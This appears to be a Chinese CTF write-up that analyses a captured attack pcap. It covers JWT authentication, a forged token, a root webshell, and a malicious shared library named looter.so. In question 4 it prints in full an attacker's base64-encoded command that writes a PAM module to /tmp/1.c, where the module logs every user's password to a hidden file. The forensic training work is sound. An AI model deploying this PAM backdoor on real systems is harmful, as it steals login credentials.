## 问1
### 题面
昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：  
该网站使用了______认证方式。（如有字母请全部使用小写）。得到的flag请使用NSSCTF{}格式提交。  

压缩包内含：goroot.pcap  
### 思路

wireshark 打开，分析流量一半都是 http。然后就 Analyze->Follow->HTTP Stream。  

筛选 http 流量信息，查找 admin 相关字段发现：
```
POST /identity HTTP/1.1
Host: 192.168.2.197:8081
Connection: keep-alive
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.2.197:8081
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.2.197:8081/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=3f8coeg6hm9vf0h5lcoifmk8o5; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODYsIk1hcENsYWltcyI6eyJhdWQiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifX0.dJArtwXjas3_Cg9a3tr8COXF7DRsuX8UjmbC1nKf8fc

username=admin&identity=admin
```
发现这个 token:`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODYsIk1hcENsYWltcyI6eyJhdWQiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifX0.dJArtwXjas3_Cg9a3tr8COXF7DRsuX8UjmbC1nKf8fc`  
base64 解密后出来是 jwt

![](1.png)

## 问2
### 题面
昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：
黑客绕过验证使用的jwt中，id和username是______。（中间使用#号隔开，例如1#admin）。得到的flag请使用NSSCTF{}格式提交。  

### 思路
还是继续 wireshark 做流量分析，绕过验证。过滤 http 流量，发现有很多 exec 执行的流量，下面有键 `command` 后面就是输入的命令，发现输入了多次 whoami 看来是检查是否提权，检查最后一个 whoami 跟踪 HTTP 流。  
复制 token ，这里就是一堆 base64 加密后的数据，用两个 `.` 隔开，删除这些 `.` 之后解密，发现 id 为 10087，username 为 admin:
![](2.png)

完成。  

## 问3
### 题面
昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：  
黑客获取webshell之后，权限是______？。得到的flag请使用NSSCTF{}格式提交。  

### 思路
![](3.png)

还是刚才那个流量，whoami 返回 root,就是 root。  
## 问4
分析 exec 流量。这里用 echo 传入 base64 加密信息，然后变成 /tmp/1.c。  
command=echo%20I2luY2x1ZGUgPHN0ZGlvLmg%2bCiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPGN1cmwvY3VybC5oPgojaW5jbHVkZSA8c3RyaW5nLmg%2bCiNpbmNsdWRlIDxzZWN1cml0eS9wYW1fYXBwbC5oPgojaW5jbHVkZSA8c2VjdXJpdHkvcGFtX21vZHVsZXMuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgpzaXplX3Qgd3JpdGVfZGF0YSh2b2lkICpidWZmZXIsIHNpemVfdCBzaXplLCBzaXplX3Qgbm1lbWIsIHZvaWQgKnVzZXJwKQp7CnJldHVybiBzaXplICogbm1lbWI7Cn0KCnZvaWQgc2F2ZU1lc3NhZ2UoY2hhciAoKm1lc3NhZ2UpW10pIHsKRklMRSAqZnAgPSBOVUxMOwpmcCA9IGZvcGVuKCIvdG1wLy5sb290ZXIiLCAiYSsiKTsKZnB1dHMoKm1lc3NhZ2UsIGZwKTsKZmNsb3NlKGZwKTsKfQoKUEFNX0VYVEVSTiBpbnQgcGFtX3NtX3NldGNyZWQoIHBhbV9oYW5kbGVfdCAqcGFtaCwgaW50IGZsYWdzLCBpbnQgYXJnYywgY29uc3QgY2hhciAqKmFyZ3YgKSB7CnJldHVybiBQQU1fU1VDQ0VTUzsKfQoKUEFNX0VYVEVSTiBpbnQgcGFtX3NtX2FjY3RfbWdtdChwYW1faGFuZGxlX3QgKnBhbWgsIGludCBmbGFncywgaW50IGFyZ2MsIGNvbnN0IGNoYXIgKiphcmd2KSB7CnJldHVybiBQQU1fU1VDQ0VTUzsKfQoKUEFNX0VYVEVSTiBpbnQgcGFtX3NtX2F1dGhlbnRpY2F0ZSggcGFtX2hhbmRsZV90ICpwYW1oLCBpbnQgZmxhZ3MsaW50IGFyZ2MsIGNvbnN0IGNoYXIgKiphcmd2ICkgewppbnQgcmV0dmFsOwpjb25zdCBjaGFyKiB1c2VybmFtZTsKY29uc3QgY2hhciogcGFzc3dvcmQ7CmNoYXIgbWVzc2FnZVsxMDI0XTsKcmV0dmFsID0gcGFtX2dldF91c2VyKHBhbWgsICZ1c2VybmFtZSwgIlVzZXJuYW1lOiAiKTsKcGFtX2dldF9pdGVtKHBhbWgsIFBBTV9BVVRIVE9LLCAodm9pZCAqKSAmcGFzc3dvcmQpOwppZiAocmV0dmFsICE9IFBBTV9TVUNDRVNTKSB7CnJldHVybiByZXR2YWw7Cn0KCnNucHJpbnRmKG1lc3NhZ2UsMjA0OCwiVXNlcm5hbWUgJXNcblBhc3N3b3JkOiAlc1xuIix1c2VybmFtZSxwYXNzd29yZCk7CnNhdmVNZXNzYWdlKCZtZXNzYWdlKTsKcmV0dXJuIFBBTV9TVUNDRVNTOwp9|base64%20-d%20>/tmp/1.c  

所以就是 1.c。  

## 问5

### 题面
昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：  
黑客在服务器上编译的恶意so文件，文件名是_____________。(请提交带有文件后缀的文件名，例如x.so)。得到的flag请使用NSSCTF{}格式提交。  

### 思路
继续看 exec 的 http 分析，发现多个 looter.so ，就是它了.  
